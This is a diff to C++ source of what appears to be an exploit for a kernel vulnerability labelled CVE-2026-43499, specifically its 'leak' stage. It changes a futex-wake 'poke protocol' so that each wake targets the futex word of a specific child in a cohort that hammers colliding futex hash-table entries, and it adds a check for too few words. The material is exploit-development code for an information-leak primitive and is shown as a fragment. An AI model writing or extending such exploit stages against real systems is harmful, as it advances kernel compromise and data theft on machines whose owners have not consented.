@@ -14,11 +14,11 @@
  *  at all -- a fake cohort that pokes when woken is enough to drive it, and a fake that
  *  never does is enough to prove the stopping side.
  *
- *  NOT YET IN IT: the wake carries how much a child owes but not which child, because
- *  the per-child futex words live in the address table, which the leak children fill and
- *  which is not ported yet. Until it is, a wake names no word and this protocol proves
- *  its own round loop -- the part that decides when to stop, and the part a device will
- *  exercise first.
+ *  The wake names each child's word, which the caller supplies: the words are the
+ *  addresses the cohort hammers, one per collision, and the table they live in is what
+ *  the leak children fill. A caller with fewer words than the cohort has is refused,
+ *  since waking the wrong suffix of a cohort is a search that waits for children that
+ *  were never told to start.
  *
  *  The cohort's poking is not a platform call and so is not in the seam: it is an atomic
  *  add by the child itself, and the seam only carries what reaches the kernel.
@@ -78,15 +78,17 @@ namespace ghostlock::backend::cve_2026_43499::leak {
     template <class Seam>
       requires memory::HeapSeam<Seam> && SnitchSeam<Seam>
     [[nodiscard]] ScanOutcome run_poke_protocol(const SnitchSetup &setup, const RegionInputs &region_inputs,
-                                                const SnitchPatience &patience,
-                                                std::size_t counter_offset) noexcept;
+                                                const SnitchPatience &patience, std::size_t counter_offset,
+                                                std::uint32_t *const *words,
+                                                std::size_t word_count) noexcept;
     /** The counter the cohort pokes, found through an offset the caller knows from its
      *  own header layout. Volatile because a child writes it. */
     template <class Seam>
       requires memory::HeapSeam<Seam> && SnitchSeam<Seam>
     [[nodiscard]] ScanOutcome run_poke_protocol(const SnitchSetup &setup, const RegionInputs &region_inputs,
-                                                const SnitchPatience &patience,
-                                                std::size_t counter_offset) noexcept {
+                                                const SnitchPatience &patience, std::size_t counter_offset,
+                                                std::uint32_t *const *words,
+                                                std::size_t word_count) noexcept {
         ScanOutcome outcome{};
         RegionLayout layout{};
         if (layout_snitch_region(region_inputs, layout) != RegionVerdict::Ok) {
@@ -94,7 +96,8 @@ namespace ghostlock::backend::cve_2026_43499::leak {
             return outcome;
         }
         const std::size_t wanted = total_futex_pokes(setup.futex_table_size, setup.collisions);
-        if (wanted == 0U || patience.wake_rounds == 0U || counter_offset >= layout.total_bytes) {
+        if (wanted == 0U || patience.wake_rounds == 0U || counter_offset >= layout.total_bytes ||
+            words == nullptr || word_count < setup.collisions) {
             outcome.status = ScanVerdict::GeometryMissing;
             return outcome;
         }
@@ -147,7 +150,7 @@ namespace ghostlock::backend::cve_2026_43499::leak {
             }
             const std::uint32_t owed = static_cast<std::uint32_t>(wanted - poked);
             for (std::size_t i = 0U; i < cohort; ++i) {
-                (void) Seam::futex_wake_private(nullptr, static_cast<std::int32_t>(owed));
+                (void) Seam::futex_wake_private(words[i], static_cast<std::int32_t>(owed));
             }
             ++round;
         }
